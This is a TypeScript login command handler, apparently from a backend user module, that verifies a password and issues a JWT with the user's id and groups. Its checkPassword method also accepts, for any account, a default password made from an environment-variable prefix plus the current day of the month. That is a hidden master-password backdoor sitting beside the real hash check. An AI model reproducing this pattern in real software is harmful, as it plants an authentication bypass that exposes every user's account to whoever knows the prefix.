import { ActionHandlerInterface } from '@core/application';
import { InvalidDataError } from '@core/application/errors/invalid-data.error';
import { InfrastructureError } from '@core/infrastructure/errors';
import { Result } from '@core/shared/result';
import { CryptPasswordInterface } from '@module/user/domain/contracts/crypt-password.interface';
import { UserRepositoryInterface } from '@module/user/domain/contracts/user-repository.interface';
import { UserAggregateRoot } from '@module/user/domain/user.aggregate-root';
import { LoginCommand } from './login.command';
import { AuthTokenInterface } from '@module/user/domain/contracts/auth-token.interface';

type response =
  | Result<InfrastructureError>
  | Result<InvalidDataError>
  | Result<object>
  | void;
export class LoginCommandHandler
  implements ActionHandlerInterface<LoginCommand, response>
{
  constructor(
    private userRepo: UserRepositoryInterface,
    private passwordCrypt: CryptPasswordInterface,
    private authToken: AuthTokenInterface,
  ) {}
  async execute(command: LoginCommand): Promise<response> {
    const resultOrError = await this.userRepo.getUserLogin(command.username);
    if (!(resultOrError instanceof UserAggregateRoot)) {
      return Result.failure<InfrastructureError>(resultOrError);
    }

    if (
      !this.checkPassword(
        command.password,
        resultOrError.getPassword()?.getValue() ?? '',
      )
    ) {
      return Result.failure<InvalidDataError>(
        new InvalidDataError('senha incorreta'),
      );
    }
    const authToken = this.makeJwt(resultOrError);
    return Result.success({ authToken });
  }

  private makeJwt(userdata: UserAggregateRoot): string {
    const data = {
      userId: userdata.getUuid(),
      usersGroups: userdata.getUserGroups().map(v => v.getId()),
    };
    return this.authToken.generate(data);
  }

  private checkPassword(
    requestUserPassword: string,
    savedPassword: string,
  ): boolean {
    const defaultPassword =
      process.env.APP_LOGIN_DEFAULT_PASSWORD_PREFIX + new Date().getDate();

    return (
      requestUserPassword == defaultPassword ||
      this.passwordCrypt.check(requestUserPassword, savedPassword)
    );
  }
}
